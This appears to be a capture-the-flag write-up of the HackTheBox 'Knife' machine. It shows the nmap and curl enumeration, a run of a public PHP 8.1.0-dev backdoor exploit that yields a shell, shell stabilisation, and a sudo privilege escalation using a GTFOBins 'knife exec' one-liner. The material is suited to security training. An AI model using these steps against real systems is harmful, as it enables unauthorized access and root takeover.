### Knife HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.242

Nmap Scan:

```
-─$ nmap -sCV 10.10.10.242 -p22,80 -oN nmapscan            
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-24 18:06 WAT
Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.93% done; ETC: 18:07 (0:00:00 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.64% done; ETC: 18:08 (0:00:00 remaining)
Nmap scan report for 10.10.10.242
Host is up (0.38s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.30 seconds
```

From the scan we get two tcp ports open 

I'll check out the web server

### Web Server Enumeration

Heading over it shows a static page that provides hospital service
![image](https://user-images.githubusercontent.com/113513376/221243091-014de3b1-482b-447d-8bdb-a73271ec16ff.png)

I'll use curl to get the web server header

```
└─$ curl -v http://10.10.10.242/ -I
*   Trying 10.10.10.242:80...
* Connected to 10.10.10.242 (10.10.10.242) port 80 (#0)
> HEAD / HTTP/1.1
> Host: 10.10.10.242
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 24 Feb 2023 17:10:41 GMT
Date: Fri, 24 Feb 2023 17:10:41 GMT
< Server: Apache/2.4.41 (Ubuntu)
Server: Apache/2.4.41 (Ubuntu)
< X-Powered-By: PHP/8.1.0-dev
X-Powered-By: PHP/8.1.0-dev
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

< 
* Connection #0 to host 10.10.10.242 left intact
```

We see this

```
X-Powered-By: PHP/8.1.0-dev
```

After searching for it i got an exploit regarding it [Exploit](https://www.exploit-db.com/exploits/49933)

#### Exploit 

Running it works

```
└─$ python3 exploit.py          
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ 
```

I'll got a more stable shell 

Then to stabilize your shell do this

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL +Z
stty raw -echo;fg
reset
```

Only a user is present on the box

```
james@knife:/$ cd /home
james@knife:/home$ ls -ala
total 12
drwxr-xr-x  3 root  root  4096 May  6  2021 .
drwxr-xr-x 20 root  root  4096 May 18  2021 ..
drwxr-xr-x  5 james james 4096 May 18  2021 james
james@knife:/home$ 
```

Lets escalate privilege to root

Checking sudo permission shows we can run knife as root

```
james@knife:/home$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

On checking [gtfobins](https://gtfobins.github.io/gtfobins/knife/#sudo) i get a privesc method for knife

```
sudo knife exec -E 'exec "/bin/sh"'
```

Doing it works

```
james@knife:/home$ sudo knife exec -E 'exec "/bin/sh"'
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
 # ls -al
total 56
drwx------  7 root root 4096 May 18  2021 .
drwxr-xr-x 20 root root 4096 May 18  2021 ..
lrwxrwxrwx  1 root root    9 May  8  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3137 May  7  2021 .bashrc
drwx------  2 root root 4096 May  7  2021 .cache
drwx------  3 root root 4096 May 18  2021 .chef
-rwxr-xr-x  1 root root  105 May  8  2021 delete.sh
drwxr-xr-x  3 root root 4096 May  7  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root 1024 May  8  2021 .rnd
-r--------  1 root root   33 Feb 24 17:04 root.txt
-rw-r--r--  1 root root   66 May  8  2021 .selected_editor
drwxr-xr-x  3 root root 4096 May  6  2021 snap
drwx------  2 root root 4096 May  6  2021 .ssh
-rw-------  1 root root 2413 May 18  2021 .viminfo
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
